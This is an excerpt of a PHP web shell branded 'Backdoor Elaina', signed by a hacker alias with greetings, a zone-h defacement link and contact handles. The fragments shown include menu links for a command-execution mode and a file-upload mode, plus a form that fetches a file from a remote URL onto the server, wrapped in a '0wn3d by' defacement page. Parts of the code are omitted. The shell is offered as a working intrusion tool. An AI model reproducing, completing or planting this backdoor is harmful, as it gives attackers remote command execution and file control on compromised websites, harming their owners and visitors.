<!--------------------------------------------
Backdoor Elaina, KosameAmegai
t.me/kosameamegai,- Japan
GreetZ: # Anon7 -  xRyukZ - Mr.Grim - mahou-shoujo.site #
2k19 - Now
--------------------------------------------->
<!DOCTYPE html>
<html>
<head>
    ...
    <meta property="og:description" content="i just want to live in peace">
    <meta property="og:image" content="https://i1.wp.com/www.crowsworldofanime.com/wp-content/uploads/2020/10/Wandering_Witch_The_Journey_of_Elaina_Episode_03-Figure_01-scaled.jpg?w=1920&ssl=1">
...
echo '<th>[ &nbsp;<a href="?path='.$lokasi.'&komend=backdoor">C0mmand</a>&nbsp; ]</th>';
echo '<th>[ &nbsp;<a href="?path='.$lokasi.'&upload=backdoor">Upload File</a>&nbsp; ]</th>';
echo "</table><br>";
...
<input type="text" name="darilink" class="up" placeholder="https://KosameAmegai.xyz/upload.txt">&nbsp;<input type="text" name="namalink" class="up" size="3" placeholder="file.txt"><input type="submit" name="linknya" class="up" value="Upload" style="cursor: pointer; border-color: #fff">
...
# Struck by 1337 #
<br><a href="http://www.zone-h.org/archive/notifier=KosameAmegai">
<img border="0" src="https://mocah.org/thumbs/920019-Zeen-Chin-mask-demon-warrior-Japanese-Art-dog.jpg" width="400"></a>

<br><center>[ ! ]
#Since 2019 ~ Japanese Hacker Rulez ~ #For Fun 
0wn3d by KosameAmegai !</p>
<p align="center">"安全なシステムはありません、不可能なことをします"</p>
<p align="center">twitter.com/amegaikosame  ||  gomen_ne@yahoo.com<center>
</p>Japan - Shinjuku City, Tokyo
